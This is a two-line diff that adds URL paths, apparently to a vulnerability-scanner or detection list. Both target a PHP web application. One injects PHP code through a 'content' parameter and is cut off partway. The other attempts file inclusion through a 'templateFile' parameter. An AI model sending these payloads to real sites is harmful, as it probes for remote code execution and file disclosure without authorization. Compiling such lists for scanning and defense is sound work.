@@ -1,0 +1,2 @@
+/index.php?g=g&m=Door&a=index&content=<?php%20echo%20md5(
+/?a=display&templateFile=README.md
